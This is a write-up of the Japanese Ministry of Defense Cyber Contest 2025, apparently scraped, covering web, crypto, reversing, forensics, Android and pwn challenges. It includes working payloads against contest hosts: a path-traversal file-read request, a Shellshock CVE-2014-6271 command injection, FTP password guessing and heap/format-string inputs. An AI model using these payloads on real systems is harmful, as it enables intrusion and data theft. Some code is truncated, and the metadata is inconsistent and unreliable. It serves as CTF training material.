---
title: 防衛省サイバーコンテスト2025 Writeup供養
contest: 防衛省サイバーコンテスト
year: 2025
difficulty: medium
vuln_type: heap_exploit
tags:
- Web-HTML注释flag
- JSON.php-base64数组
- ECC椭圆曲线
- Shellshock-CVE-2014-6271
- FTP-pcap-密码爆破
- Android-NDK-crackme
- Brainfuck
- vsFTPd-3.0.3
- Android-APK
- peakey-encode
- emoji-steganography
- pattern-XOR
- ct-batch
- cookie-deserialize
attack_chain: 'WE-1: HTML注释 <!--flag{TakeMeToTheFlag}-->|WE-2: 石中剑(Stones)游戏|WE-3: download.php?fName=/etc/WE-3读文件 flag{fGrantUB56skBTlmF14mostFP}|WE-4: json.php POST data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0= base64+JSON array|CRYPTO: 椭圆曲线 a=56,b=58,p=127 基准点(42,67) 公开键(53,30)求私钥d|REVERSE-1: C语言质数计数 k=10000000 简单|REVERSE-2: Peakey Encode emoji隐写 flag{🚒,😤,🐈,😡,🙌,...}替换|REVERSE-3: Brainfuck代码|LOG: 192.168.100.106访问日志分析|FORENSIC: vsFTPd 3.0.3 密码爆破 agita:zyyzzyzy|MOBILE: Android NDK SecretGenerater.checkNative(str) 16字符比对 VUSTIq@H~]wGSBVH|PWN-1: Shellshock CVE-2014-6271 (){:;};echo;cat /etc/PW-1 flag{>:(!shellshock!}|PWN-4: Cat game PrintHeap/AllocateCat/Print/Free|ct batch: FDATA1-9生成flag{...}|pattern XOR: pattern1/2/3 XOR compare'
key_payload: 'data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d|data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=|ECCScalarMult(G, d)=(Px, Py) G=(42,67) P=(53,30) a=56 b=58 p=127|cur -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php|AAA^AAsAABAA$AAnAACAA-AAmeow(PE)|USER agita PASS zyyzzyzy|(){:;};echo Content-type: text/plain;echo;/bin/cat /etc/PW-1'
one_liner: 防衛省サイバーコンテスト2025 Writeup供養多方向:HTML注释flag+石中剑+download.php读源+JSON base64数组+ECC椭圆曲线(a=56,b=58,p=127)求私钥+PeakeyEncode emoji隐写🚒😤🐈😡🙌+Brainfuck+vsFTPd密码爆破agita:zyyzzyzy+Android NDK SecretGenerater+Shellshock CVE-2014-6271+Cat game UAF+ct batch+pattern XOR
lesson: '1) HTML注释flag直接读<!--flag{...}-->; 2) JSON.php data base64 JSON数组: [{{name,value}},{name,flag,value,on}]; 3) ECC小素数暴力枚举:d in 1..p-1, kG=(d*42, d*67) mod p; 4) PeakeyEncode emoji替换:''>''→🚒 ''<''→😭 ''+''→😡 ''-''→🙌 ''.''→🌺 '',''→✍️ ''[''→😤 '']''→🐈; 5) vsFTPd 3.0.3 密码爆破+USER agita枚举; 6) Android NDK SecretGenerater.decode(str).equals("VUSTIq@H~]wGSBVH") 16字符; 7) Shellshock CVE-2014-6271:(){:;};echo Content-type:text/plain;echo;/bin/cat /etc/PW-1'
quality: high
full_path: 防衛省サイバーコンテスト2025_Writeup供養.full.md
meta_path: 防衛省サイバーコンテスト2025_Writeup供養.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 防衛省サイバーコンテスト2025 Writeup供養。防衛省サイバーコンテスト2025 Writeup供養多方向:HTML注释flag+石中剑+download.php读源+JSON base64数组+ECC椭圆曲线(a=56,b=58,p=127)求私钥+PeakeyEncode emoji隐写🚒😤🐈😡🙌+Brainfuck+vsFTPd密码爆破agita:zyyzzyzy+Android...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/226942.html
reasoning_chain:
- WE-1 HTML 源码 → 触发点：注释 <!--flag{TakeMeToTheFlag}-->
- WE-3 拿 download.php?fName=/etc/WE-3 → 假设：路径可控读文件
- 动作：curl -X POST -d 'fName=/etc/WE-3' → 观察：flag{fGrantUB56skBTlmF14mostFP}
- WE-4 json.php POST data=base64 → 假设：JSON 解析可控字段
- 动作：W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=
- CRYPTO ECC a=56,b=58,p=127 G=(42,67) P=(53,30) → 假设：小素数暴力枚举 d
- '动作：for d in 1..p-1: ECCScalarMult(G,d)=(d*42,d*67) mod p → 命中 d'
- REVERSE-2 PeakeyEncode emoji → 假设：emoji 替换映射（>→🚒 <→😭 等）
- 动作：替换表逆推 → flag{🚒😤🐈😡🙌…}
- LOG vsFTPd 3.0.3 → 假设：明文密码弱 → 动作：USER agita + PASS 字典爆破
- MOBILE Android NDK SecretGenerater.checkNative(str) → 假设：16 字符硬编码比对
- 动作：反编译 libnative.so 找 'VUSTIq@H~]wGSBVH' → flag
failed_attempts:
- 试图解 ECC 用大素数 Pollard rho → 失败：p=127 直接枚举 d 更快
- 试图不解码 emoji 直接读 flag → 失败：flag 藏在替换结果
key_observations:
- HTML 注释藏 flag 是 web 入门点
- ECC 小素数 (p<2^16) 直接暴力枚举私钥 d
- PeakeyEncode emoji 替换是日本 CTF 常见迷因编码
- Shellshock CVE-2014-6271 (){:;}; echo; cat 是 CGI/PHP 经典 RCE
- vsFTPd 3.0.3 弱密码爆破 agita:zyyzzyzy 是经典痕迹
prerequisites:
- ECC 标量乘法 (GF(p))
- Android NDK 反编译 (IDA/Ghidra)
- Shellshock CVE-2014-6271 原理
- Peakey Encode / emoji 隐写映射
---
# 防衛省サイバーコンテスト2025 Writeup供養

> 原文: https://www.ctfiot.com/226942.html
> ID: 226942


```
    #include <stdio.h>
int main(){
 int i,j,k,l;
 int cnt = 0;
 //k=(((10/2*4/10*4/2)+97)*10)-10;
 k = 10000000;
 printf("%d\n", k);
 for(i=2;i<=k;++i){
 l=0;
 for(j=2;j
<html lang="ja-JP">
<head>
<meta charset="utf-8" />
<title>WE-1</title>
</head>

<h2>このページにフラグがあります</h2>

</html>
<!-- flag{TakeMeToTheFlag} -->
<!-- @format -->

<!DOCTYPE html>
<html
 xmlns="http://www.w3.org/1999/xhtml"
 xml:
lang="ja-JP"
 lang="ja-JP"
 prefix="og: http://ogp.me/ns#"
>
 <head>
 <meta charset="utf-8" />
 <meta name="robots" content="noindex" />
 <title>NO LIFE NO STONE</title>
 <!--<script type="text/javascript" src="secret/download.js"></script>-->
 </head>

 
 <h2>そのへんの石</h2>
 ※ダウンロードの仕組みは調子悪いので(^^;
 欲しい方は画像を直接コピーしてね。

 <hr />
 
 <!-- ダウンロード -->
 
 <!-- ダウンロード -->
 
 <!-- ダウンロード -->
 
 <!-- ダウンロード -->
 
 <!-- ダウンロード -->
 
</html>
function dlFIle(file){
 var dataS = 'fName=' + file;
 var xhr = new XMLHttpRequest();
 xhr.open('POST','/secret/download.php');
 xhr.send(dataS);
 xhr.onload = function() {
 var strS = xhr.responseText;
 };
}
$ curl -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php
<snip>
flag{fGrantUB56skBTlmF14mostFP}
POST /json.php HTTP/2
Host: we4-prod.2025winter-cybercontest.net
Cookie: PHPSESSID=iqissnh6b5gl2r1p3p98vu1bld
Content-Length: 45
Accept: */*
Origin: https://we4-prod.2025winter-cybercontest.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://we4-prod.2025winter-cybercontest.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d
POST /json.php HTTP/2
Host: we4-prod.2025winter-cybercontest.net
Cookie: PHPSESSID=iqissnh6b5gl2r1p3p98vu1bld
Content-Length: 85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://we4-prod.2025winter-cybercontest.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://we4-prod.2025winter-cybercontest.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=
楕円曲線のパラメータは以下の通りとします。

a=56,b=58,p=127

基準点(42,67)と設定した場合、公開鍵の値が下記になる秘密鍵の最も小さい値を答えてください。

公開鍵(53,30)
require './encode.rb'
flag = File.open("flag", "r").read()
generate = PeakeyEncode.new.generate(flag)
generate = generate.gsub(">", "🚒")
generate = generate.gsub("<", "😭")
generate = generate.gsub("+", "😡")
generate = generate.gsub("-", "🙌")
generate = generate.gsub(".", "🌺")
generate = generate.gsub(",", "✍️")
generate = generate.gsub("[", "😤")
generate = generate.gsub("]", "🐈")

sjis = generate.force_encoding(Encoding::
SJIS)
p sjis.encode(Encoding::
UTF_8)
file=File.binread("encryption")

file = file.force_encoding(Encoding::
UTF_8).encode(Encoding::
SJIS)
puts file
file = file.gsub("🚒",">")
file = file.gsub("😭","<")
file = file.gsub("😡","+")
file = file.gsub("🙌","-")
file = file.gsub("🌺",".")
file = file.gsub("✍",",")
file = file.gsub("😤","[")
file = file.gsub("🐈","]")
puts file
😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺🙌🙌🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡🌺😡🌺😡😡😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.-----------.++++++.++++++++++++++++++++.--.----------.++++++.----------------------.++++++++++++.+++.+.++++++++.------------------------.+++.++++++++++++++++.-----------------.------------------------------------------------.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.
192.168.100.106 - - [11/Jul/2024:09:36:24 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.106 - - [11/Jul/2024:09:36:29 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:36:30 +0900] "GET /ctf/fr1/index.php?msg=2 HTTP/1.1" 200 478
192.168.100.106 - - [11/Jul/2024:09:45:54 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:46:00 +0900] "GET /mypage.php?sesid=MTc2NzIyNTU5OSw2LHVzZXI2 HTTP/1.1" 200 281
220 (vsFTPd 3.0.3)
USER agita
331 Please specify the password.
PASS wwwww
530 Login incorrect.
USER agita
331 Please specify the password.
PASS yyyyyyyy
530 Login incorrect.
USER agita
331 Please specify the password.
PASS zyyzzyzy
230 Login successful.
package jp.go.cybercontest.insecureapk;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
 protected void onCreate(Bundle paramBundle) {
 super.onCreate(paramBundle);
 setContentView(R.layout.activity_main);
 ((Button)findViewById(R.id.button)).setOnClickListener(new AppListener());
 }

 private class AppListener implements View.OnClickListener {
 private AppListener() {}

 public void onClick(View param1View) {
 EditText editText = (EditText)MainActivity.this.findViewById(R.id.inputText);
 TextView textView = (TextView)MainActivity.this.findViewById(R.id.flush);
 if (param1View.getId() == R.id.button) {
 String str = editText.getText().toString();
 if (str.length() != 16) {
 textView.setText("Incorrect.");
 } else if (SecretGenerater.decode(str).equals("VUSTIq@H~]wGSBVH")) {
 textView.setText("Congratulations! you got flag.");
 } else {
 textView.setText("Incorrect.");
 }
 }
 }
 }
}
package jp.go.cybercontest.insecureapk;

public class SecretGenerater {
 static {
 System.loadLibrary("insecureapp");
 }

 public static native String checkNative(String paramString);

 public static String decode(String paramString) {
 paramString = checkNative(paramString);
 return (paramString.length() == 16) ? paramString : "";
 }
}
$ curl -A "() { :;}; echo Content-type:
text/plain;echo;/bin/cat /etc/PW-1" https://pw1-prod.2025winter-cybercontest.net/cgi-bin/n.cgi
flag{>:(!shellshock!}
└─$ nc pw4-prod.2025winter-cybercontest.net 30001
　∧,,∧
（=・ω・）meow
（,, ｕｕ)

What's the cat's say?
AAA%AAsAABAA$AAnAACAA-AAwodm
Yes, I'll give you a flag.
flag{I_will_Golondon}
$ nc pw5-prod.2025winter-cybercontest.net 30001
　∧,,∧
（=・ω・）
（,, ｕｕ)
Dog goes woof.
Then, Cat?

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 4

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 2
What does the cat say?
AAA%AAsAABAA$AAnAACAA-AAmeow
Congratulations!
flag{cat_g0es_me0w}
@echo off
setlocal
set FDATA1=23
set FDATA2=61
set FDATA3=34
set FDATA4=25
set FDATA5=75
set FDATA6=64
set FDATA7=93
set FDATA8=44
set FDATA9=72
md flags
chdir flags
for /l %%n in (10,1,99) do (
 type null > flags_%%n.txt
 echo flag{%FDATA5%%FDATA4%%%n%FDATA1%%FDATA6%%FDATA2%%%n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} > flags_%%n.txt
 if %%n==%FDATA4% echo > flags_%%n.txt:
TrueFlag
)

endlocal
>>> with open("pattern1", "rb") as f:
... d1=f.read()
...
>>> with open("compare","rb") as f:
... c=f.read()
...
>>> with open("pattern2", "rb") as f:
... d2=f.read()
...
>>> with open("pattern3", "rb") as f:
... d3=f.read()
...
>>> "".join([chr(d1[i] ^ c[i]) for i in range(len(c))])
'find1\x05\x1b?4/'
>>> "".join([chr(d2[i] ^ c[i]) for i in range(len(c))])
'ciBd*\x16z\x95SQ'
>>> "".join([chr(d3[i] ^ c[i]) for i in range(len(c))])
'flag{¬\x1dïý}'
>>> [chr(d3[i] ^ c[i]) for i in range(len(c))]
['f', 'l', 'a', 'g', '{', '¬', '\x1d', 'ï', 'ý', '}']
>>> [d3[i] ^ c[i] for i in range(len(c))]
[102, 108, 97, 103, 123, 172, 29, 239, 253, 125]
```
